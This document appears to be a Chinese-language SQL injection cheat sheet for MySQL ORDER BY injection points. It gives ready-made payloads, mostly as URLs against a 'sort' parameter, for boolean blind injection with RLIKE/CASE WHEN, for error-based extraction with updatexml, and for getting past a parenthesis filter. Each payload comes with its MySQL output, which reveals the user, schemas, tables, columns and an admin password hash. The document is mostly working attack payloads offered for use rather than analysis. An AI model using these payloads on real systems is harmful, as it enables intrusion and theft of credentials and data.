# OrderBy 注入点-布尔盲注

## 0x00 记忆方式

select * from test order by 1 RLIKE (CASE WHEN (1=1) THEN 1 ELSE 0x28 END)



当 1=1 为true时会返回1页面会保持不变

当 1=2 为false时页面会报错



这样就可以根据这个差异来判断是否正确

## 0x01 基本数据

```plain
mysql> select version();
+-----------+
| version() |
+-----------+
| 5.5.53    |
+-----------+
1 row in set (0.27 sec)

mysql> select user();
+----------------+
| user()         |
+----------------+
| root@localhost |
+----------------+
1 row in set (0.00 sec)

mysql> select database();
+------------+
| database() |
+------------+
| test       |
+------------+
1 row in set (0.00 sec)

mysql> select * from test;
+----+------+------+---------+
| id | test | map  | content |
+----+------+------+---------+
|  1 | 1    | 1    | 1       |
|  2 | 2    | 2    | 2       |
|  3 | 3    | 3    | 3       |
+----+------+------+---------+
3 rows in set (0.00 sec)

mysql> select * from tdb_admin;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 7fef6171469e80d32c0559f88b377245 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```

## 0x02 读取数据库版本/当前连接用户/当前连接的数据库

读取不同的内容

例如:

substring(user(),1,1) = r

substring(user(),2,1) = o



web语句: http://www.test.com/sql.php?sort=1 RLIKE (CASE WHEN (substring(user(),1,1)='r') THEN 1 ELSE 0x28 END)



数据库语句: select * from test order by 1 RLIKE (CASE WHEN (substring(user(),1,1)='r') THEN 1 ELSE 0x28 END);



```plain
mysql> select * from test order by 1 RLIKE (CASE WHEN (substring(user(),1,1)='r') THEN 1 ELSE 0x28 END);
+----+------+------+---------+
| id | test | map  | content |
+----+------+------+---------+
|  1 | 1    | 1    | 1       |
|  2 | 2    | 2    | 2       |
|  3 | 3    | 3    | 3       |
+----+------+------+---------+
3 rows in set (0.00 sec)
```



猜对的情况页面会保持不变

错误的情况会爆错/页面数据变为空

## 0x03 猜库名

注意: LIMIT 0 修改会显示其他库名

例如:

LIMIT 0,1 修改为0 就是出1库

LIMIT 1,1 修改为1 就是出2库



```plain
// 演示数据
mysql> SELECT schema_name FROM information_schema.schemata LIMIT 0,1;
+--------------------+
| schema_name        |
+--------------------+
| information_schema |
+--------------------+
1 row in set (0.00 sec)
```



web语句: http://www.test.com/sql.php?sort=1 RLIKE (CASE WHEN (substring((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)='i') THEN 1 ELSE 0x28 END);



读取1库库名第一个字: select * from test order by 1 RLIKE (CASE WHEN (substring((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)='i') THEN 1 ELSE 0x28 END);



```plain
mysql> select * from test order by 1 RLIKE (CASE WHEN (substring((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)='i') THEN 1 ELSE 0x28 END);
+----+------+------+---------+
| id | test | map  | content |
+----+------+------+---------+
|  1 | 1    | 1    | 1       |
|  2 | 2    | 2    | 2       |
|  3 | 3    | 3    | 3       |
+----+------+------+---------+
3 rows in set (0.00 sec)
```



读取1库库名第二个字: select * from test order by 1 RLIKE (CASE WHEN (substring((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),2,1)='n') THEN 1 ELSE 0x28 END);



```plain
mysql> select * from test order by 1 RLIKE (CASE WHEN (substring((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),2,1)='n') THEN 1 ELSE 0x28 END);
+----+------+------+---------+
| id | test | map  | content |
+----+------+------+---------+
|  1 | 1    | 1    | 1       |
|  2 | 2    | 2    | 2       |
|  3 | 3    | 3    | 3       |
+----+------+------+---------+
3 rows in set (0.00 sec)
```

## 0x04 猜表名

注意: table_schema=xxx 修改为其他库会爆出其他库的数据

例如:

table_schema=database()  会获取当前连接的库数据

table_schema='test' 会获取test库数据



注意: LIMIT 0 修改会爆出不同的表名

例如:

LIMIT 0,1 修改为0 就是出1表

LIMIT 1,1 修改为1 就是出2表



```plain
// 演示数据
mysql> SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1;
+------------+
| table_name |
+------------+
| tdb_admin  |
+------------+
1 row in set (0.00 sec)
```



web语句: http://www.test.com/sql.php?sort=1 RLIKE (CASE WHEN (substring((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1),1,1)='t') THEN 1 ELSE 0x28 END)



数据库语句-读取当前库的第一张表名的第一个字: select * from test order by 1 RLIKE (CASE WHEN (substring((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1),1,1)='t') THEN 1 ELSE 0x28 END);



```plain
mysql> select * from test order by 1 RLIKE (CASE WHEN (substring((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1),1,1)='t') THEN 1 ELSE 0x28 END);
+----+------+------+---------+
| id | test | map  | content |
+----+------+------+---------+
|  1 | 1    | 1    | 1       |
|  2 | 2    | 2    | 2       |
|  3 | 3    | 3    | 3       |
+----+------+------+---------+
3 rows in set (0.00 sec)
```



数据库语句-读取当前库的第一张表名的第二个字: select * from test order by 1 RLIKE (CASE WHEN (substring((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1),2,1)='d') THEN 1 ELSE 0x28 END);



```plain
mysql> select * from test order by 1 RLIKE (CASE WHEN (substring((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1),2,1)='d') THEN 1 ELSE 0x28 END);
+----+------+------+---------+
| id | test | map  | content |
+----+------+------+---------+
|  1 | 1    | 1    | 1       |
|  2 | 2    | 2    | 2       |
|  3 | 3    | 3    | 3       |
+----+------+------+---------+
3 rows in set (0.00 sec)
```

## 0x05 猜字段

table_schema = "xx" 要爆的数据库名

table_name = "xx" 要爆的表名



limit 0 表示要爆的位置

例如:

表tdb_admin的字段为 id,usernam,password

limit 0 = id

limit 1 = username

limit 2 = password

```plain
// 演示数据
mysql> SELECT column_name FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' limit 0,1;
+-------------+
| column_name |
+-------------+
| id          |
+-------------+
1 row in set (0.00 sec)
```

web语句: http://www.test.com/sql.php?sort=1

猜test库 tdb_admin表的第一个字段名第一个字: select * from test order by 1 RLIKE (CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' limit 0,1),1,1)='i') THEN 1 ELSE 0x28 END);



```plain
mysql> select * from test order by 1 RLIKE (CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' limit 0,1),1,1)='i') THEN 1 ELSE 0x28 END);
+----+------+------+---------+
| id | test | map  | content |
+----+------+------+---------+
|  1 | 1    | 1    | 1       |
|  2 | 2    | 2    | 2       |
|  3 | 3    | 3    | 3       |
+----+------+------+---------+
3 rows in set (0.01 sec)
```

猜test库 tdb_admin表的第一个字段名第二个字: select * from test order by 1 RLIKE (CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' limit 0,1),2,1)='d') THEN 1 ELSE 0x28 END);

```plain
mysql> select * from test order by 1 RLIKE (CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' limit 0,1),2,1)='d') THEN 1 ELSE 0x28 END);
+----+------+------+---------+
| id | test | map  | content |
+----+------+------+---------+
|  1 | 1    | 1    | 1       |
|  2 | 2    | 2    | 2       |
|  3 | 3    | 3    | 3       |
+----+------+------+---------+
3 rows in set (0.01 sec)
```

## 0x06 猜内容

注意: limit 0 表示要显示那一条数据

limit 0 表示第一条

limit 1 表示第二条

```plain
mysql> SELECT username FROM test.tdb_admin limit 0,1;
+----------+
| username |
+----------+
| admin    |
+----------+
1 row in set (0.00 sec)
```

web语句: http://www.test.com/sql.php?sort=1 RLIKE (CASE WHEN (substring((SELECT 字段名 FROM 库名.表名 limit 0,1),1,1)='a') THEN 1 ELSE 0x28 END);

读取某库某表某字段第一个字: select * from test order by 1 RLIKE (CASE WHEN (substring((SELECT 字段名 FROM 库名.表名 limit 0,1),1,1)='a') THEN 1 ELSE 0x28 END);

```plain
mysql> select * from test order by 1 RLIKE (CASE WHEN (substring((SELECT username FROM test.tdb_admin limit 0,1),1,1)='a') THEN 1 ELSE 0x28 END);
+----+------+------+---------+
| id | test | map  | content |
+----+------+------+---------+
|  1 | 1    | 1    | 1       |
|  2 | 2    | 2    | 2       |
|  3 | 3    | 3    | 3       |
+----+------+------+---------+
3 rows in set (0.00 sec)
```

读取某库某表某字段第二字: select * from test order by 1 RLIKE (CASE WHEN (substring((SELECT 字段名 FROM 库名.表名 limit 0,1),2,1)='d') THEN 1 ELSE 0x28 END);

```plain
mysql> select * from test order by 1 RLIKE (CASE WHEN (substring((SELECT username FROM test.tdb_admin limit 0,1),2,1)='d') THEN 1 ELSE 0x28 END);
+----+------+------+---------+
| id | test | map  | content |
+----+------+------+---------+
|  1 | 1    | 1    | 1       |
|  2 | 2    | 2    | 2       |
|  3 | 3    | 3    | 3       |
+----+------+------+---------+
3 rows in set (0.00 sec)
```

# OrderBy 注入点-爆错注入

## 0x00 记忆方式

updatexml(1,concat(0x7e,(payload),0x7e),1)

## 0x01 爆数据库版本



web语句: http://www.test.com/sql.php?sort=id, updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)



数据库语句: select * from test order by id, updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);



```plain
mysql> select * from test order by id, updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~5.5.53~'
```

## 0x02 爆当前连接用户

web语句: http://www.test.com/sql.php?sort=id, updatexml(1,concat(0x7e,(SELECT user()),0x7e),1);



数据库语句: select * from test order by id,  updatexml(1,concat(0x7e,(SELECT user()),0x7e),1);



```plain
mysql> select * from test order by id, updatexml(1,concat(0x7e,(SELECT user()),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'
```

## 0x03 爆当前连接的数据库

web语句: http://www.test.com/sql.php?sort=id, updatexml(1,concat(0x7e,(SELECT database()),0x7e),1);



数据库语句: select * from test order by id, updatexml(1,concat(0x7e,(SELECT database()),0x7e),1);



```plain
mysql> select * from test order by id, updatexml(1,concat(0x7e,(SELECT database()),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~test~'
```

## 0x04 爆库名

注意: LIMIT 0 修改会显示其他库名

例如:

LIMIT 0,1 修改为0 就是出1库

LIMIT 1,1 修改为1 就是出2库



web语句: http://www.test.com/sql.php?sort=id,updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1),0x7e),1)



数据库语句: select * from test order by id,updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1),0x7e),1);



```plain
mysql> select * from test order by id,updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~~information_schema~~'
```

## 0x05 爆表名

注意: table_schema=xxx 修改为其他库会查出其他库的数据

例如:

table_schema=database()  会获取当前连接的库数据

table_schema='test' 会获取test库数据



注意: LIMIT 0 修改会爆出不同的表名

例如:

LIMIT 0,1 修改为0 就是出1表

LIMIT 1,1 修改为1 就是出2表



web语句: http://www.test.com/sql.php?sort=id,updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1),0x7e),1)



数据库语句: select * from test order by id,updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1),0x7e),1);



```plain
mysql> select * from test order by id,updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~~tdb_admin~~'
```

## 0x06 暴字段

table_schema = "xx" 要看的数据库名

table_name = "xx" 要看的表名



limit 0 表示要爆的位置

例如:

表tdb_admin的字段为 id,usernam,password

limit 0 = id

limit 1 = username

limit 2 = password



web语句: http://www.test.com/sql.php?sort=id, updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' LIMIT 0,1),0x7e),1)



数据库语句-爆test库 tdb_admin表的字段名: select * from test order by id, updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' LIMIT 0,1),0x7e),1);



```plain
mysql> select * from test order by id, updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' LIMIT 0,1),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~~id~~'
```

## 0x07 爆内容

注意: limit 0 表示要显示那一条数据

limit 0 表示第一条

limit 1 表示第二条

web语句: http://www.test.com/sql.php?sort=id, updatexml(1, concat(0x7e,(SELECT distinct concat(0x7e,字段名,0x3a,字段名,0x3a,字段名,0x7e) FROM 库名.表名 limit 0,1)),1)



数据库语句: select * from test order by id, updatexml(1, concat(0x7e,(SELECT distinct concat(0x7e,字段名,0x3a,字段名,0x3a,字段名,0x7e) FROM 库名.表名 limit 0,1)),1)

```plain
mysql> select * from test order by id, updatexml(1, concat(0x7e,(SELECT distinct concat(0x7e,id,0x3a,username,0x3a,password,0x7e) FROM test.tdb_admin limit 0,1)),1);
ERROR 1105 (HY000): XPATH syntax error: '~~1:admin:7fef6171469e80d32c0559'
```

# OrderBy 注入点-case-条件判断绕过括号过滤

## 0x00 概要

不允许 “括号” 出现时的注入方法

id-case when 1 like 1 then 0 else 2*1e308 end

## 0x01 测试数据

```plain
mysql> select user();
+----------------+
| user()         |
+----------------+
| root@localhost |
+----------------+
1 row in set (0.00 sec)
```



```plain
mysql> select current_user;
+----------------+
| current_user   |
+----------------+
| root@localhost |
+----------------+
1 row in set (0.00 sec)
```



```plain
mysql> select * from tdb_goods;
+----------+----------------------------+------------+------------+-------------+---------+------------+
| goods_id | goods_name                 | goods_cate | brand_name | goods_price | is_show | is_saleoff |
+----------+----------------------------+------------+------------+-------------+---------+------------+
|        1 | R510VC 15.6英寸笔记本       | 笔记本     | 华硕      |    3399.000 |       1 |          0 |
+----------+----------------------------+------------+------------+-------------+---------+------------+
1 row in set (0.00 sec)
```

## 0x02 测试

注意:

如果使用了like又使用了延时会导致全表查询



例如:

tdb_goods 表 数据为 23 条

延时 0.1S

0.1 * 23 = 2.3S 最后会延时2.3S 所以要尽量避免这样干



```plain
// 正确的情况
// 会返回原来的数据页面保持不变
mysql> select * from tdb_goods order by goods_id-case when 1 like 1 then 0 else 2*1e308 end;
+----------+----------------------------+------------+------------+-------------+---------+------------+
| goods_id | goods_name                 | goods_cate | brand_name | goods_price | is_show | is_saleoff |
+----------+----------------------------+------------+------------+-------------+---------+------------+
|        1 | R510VC 15.6英寸笔记本       | 笔记本     | 华硕      |    3399.000 |       1 |          0 |
+----------+----------------------------+------------+------------+-------------+---------+------------+
1 row in set (0.00 sec)
```



```plain
// 查询current_user数据正确的情况
// 会返回原来的数据页面保持不变，说明 current_user 第一位为 “r”
mysql> select * from tdb_goods order by goods_id-case when current_user like 'r%' then 0 else 2*1e308 end;
+----------+----------------------------+------------+------------+-------------+---------+------------+
| goods_id | goods_name                 | goods_cate | brand_name | goods_price | is_show | is_saleoff |
+----------+----------------------------+------------+------------+-------------+---------+------------+
|        1 | R510VC 15.6英寸笔记本       | 笔记本     | 华硕      |    3399.000 |       1 |          0 |
+----------+----------------------------+------------+------------+-------------+---------+------------+
1 row in set (0.00 sec)
```



```plain
// 错误的情况
// 页面会爆错，如果关闭了错误提示，页面的数据会为空
mysql> select * from tdb_goods order by goods_id-case when 1 like 2 then 0 else 2*1e308 end;
ERROR 1690 - DOUBLE value is out of range in '(2 * 1e308)'
```